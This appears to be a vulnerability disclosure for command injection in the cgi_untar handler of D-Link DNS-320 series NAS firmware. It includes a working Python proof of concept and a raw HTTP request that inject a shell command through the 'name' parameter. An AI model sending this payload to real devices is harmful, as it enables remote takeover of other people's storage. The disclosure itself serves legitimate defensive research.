# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)
# Affected version
DLINK DNS-320/320L/321/323/325/327L all versions of the firmware
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_untar function of the file /cgi-bin/webfile_mgr.cgi.  The variable `name`is passed from a POST request and is assigned to `v5` via the `snprintf` function at line 36 and invoked by the `popen` command, the fix_path_special_char function did not work which leads to command execution. 
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723733729548-36a15469-1375-4b6f-b985-3e01119d22d9.png#averageHue=%23fdfdfd&clientId=u465935ab-a5f8-4&from=paste&height=342&id=u6a437f9f&originHeight=596&originWidth=1175&originalType=binary&ratio=1&rotation=0&showTitle=false&size=73674&status=done&style=none&taskId=u238fa5df-3ce6-48f0-bbc6-8883b3702fe&title=&width=674)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723733720319-c0a251e5-6a77-43af-8e9b-05d6376f19b5.png#averageHue=%23fafaf9&clientId=u465935ab-a5f8-4&from=paste&height=247&id=uffcdd6db&originHeight=247&originWidth=813&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20871&status=done&style=none&taskId=ufd0b5b29-8375-4e9e-8cd0-f447a275a86&title=&width=813)
# POC
```python
import requests

url = "http://192.168.0.32/cgi-bin/webfile_mgr.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_untar&name=%0atouch%09/tmp/123%0a.tar.tgz&path=122"
response = requests.post(url, headers=headers, data=data)
print(response.text)

```

```
POST /cgi-bin/webfile_mgr.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 110
Origin: http://192.168.0.32
Connection: close
Cookie: username=admin
Priority: u=1

cmd=cgi_untar&name=%0atouch%09/tmp/123%0a.tar.tgz&path=122
```

